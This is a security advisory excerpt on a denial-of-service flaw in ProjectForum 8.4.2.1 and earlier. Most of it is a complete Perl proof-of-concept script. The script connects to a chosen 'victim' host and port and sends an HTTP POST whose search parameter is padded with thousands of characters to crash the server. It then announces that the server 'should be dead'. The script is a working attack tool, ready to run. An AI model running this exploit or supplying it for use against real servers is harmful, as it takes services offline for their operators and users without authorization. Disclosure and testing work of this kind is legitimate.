source: http://www.securityfocus.com/bid/9271/info

It has been reported that ProjectForum may be prone to a denial of service vulnerability that may allow an attacker to cause the server to crash by sending an excessively long string via the 'find' request to the server.

ProjectForum versions 8.4.2.1 and prior have been reported to be prone to this issue. 

#!/usr/bin/perl -w

############################################################
#                                                          #
# ProjectForum 8.4.2.1 and below DoS Proof of Concept Code #
#  by Peter Winter-Smith [peter4020@hotmail.com]           #
#                                                          #
############################################################

use IO::Socket;

if(!($ARGV[1]))
{
print "\nUsage: pfdos.pl <victim> <port>\n" .
     "\tdefault port is 3455\n\n";
exit;
}

$victim = IO::Socket::INET->new(Proto=>'tcp',
                              PeerAddr=>$ARGV[0],
                              PeerPort=>$ARGV[1])
                          or die "Unable to connect to $ARGV[0] " .
                                 "on port $ARGV[1]";

$DoSpacket = '' .
 'POST /1/Search HTTP/1.1' . "\x0d\x0a" .
 'Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, ' .
 'application/x-gsarcade-launch, application/vnd.ms-excel, ' .
 'application/vnd.ms-powerpoint, application/msword, ' .
 'application/x-shockwave-flash, */*' . "\x0d\x0a" .
 'Referer: http://localhost:3455/1/Search' . "\x0d\x0a" .
 'Accept-Language: en-gb..Content-Type: application/x-www-form-' .
 'urlencoded' . "\x0d\x0a" .
 'Accept-Encoding: gzip, deflate' . "\x0d\x0a" .
 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ' .
 'xxxxxxxxxxxxx' . "\x20" .
 '1.0.5; .NET CLR 1.0.3705; .NET CLR 1.1.4322)' . "\x0d\x0a" .
 'Host: localhost:3455' . "\x0d\x0a" .
 'Content-Length: 6306' . "\x0d\x0a" .
 'Connection: Keep-Alive' . "\x0d\x0a" .
 'Cache-Control: no-cache' . "\x0d\x0a" . "\x0d\x0a" .
 'q=' . 'a'x6292 . '&action=Find' . "\x0d\x0a";


print $victim $DoSpacket;

print " + Making Request ...\n + Server should be dead!!\n";

sleep(4);
close($victim);

print "Done.\n";
exit;